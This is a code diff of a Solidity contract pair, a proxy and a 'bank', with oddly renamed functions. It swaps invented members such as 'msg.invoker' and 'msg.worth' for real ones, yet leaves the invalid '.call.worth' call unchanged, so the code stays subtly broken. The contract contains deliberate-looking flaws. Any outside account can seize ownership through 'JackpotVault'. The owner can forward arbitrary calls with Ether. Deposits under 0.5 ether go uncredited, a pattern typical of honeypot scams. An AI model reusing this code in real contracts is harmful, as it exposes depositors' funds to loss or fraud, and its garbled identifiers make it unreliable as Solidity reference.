@@ -1,10 +1,10 @@
 pragma solidity ^0.4.24;
 
 contract PortalGate  {
-    modifier onlyOwner { if (msg.invoker == Owner) _; } address Owner = msg.invoker;
+    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
     function shiftgoldLord(address _owner) public onlyOwner { Owner = _owner; }
     function portalGate(address aim, bytes info) public payable {
-        aim.call.worth(msg.worth)(info);
+        aim.call.worth(msg.value)(info);
     }
 }
 
@@ -15,21 +15,21 @@ contract BankwinningsProxy is PortalGate {
     function () public payable { }
 
     function JackpotVault() public payable {
-        if (msg.invoker == tx.origin) {
-            Owner = msg.invoker;
+        if (msg.sender == tx.origin) {
+            Owner = msg.sender;
             bankWinnings();
         }
     }
 
     function bankWinnings() public payable {
-        if (msg.worth > 0.5 ether) {
-            Deposits[msg.invoker] += msg.worth;
+        if (msg.value > 0.5 ether) {
+            Deposits[msg.sender] += msg.value;
         }
     }
 
     function collectBounty(uint256 sum) public onlyOwner {
-        if (sum>0 && Deposits[msg.invoker]>=sum) {
-            msg.invoker.transfer(sum);
+        if (sum>0 && Deposits[msg.sender]>=sum) {
+            msg.sender.transfer(sum);
         }
     }
 }
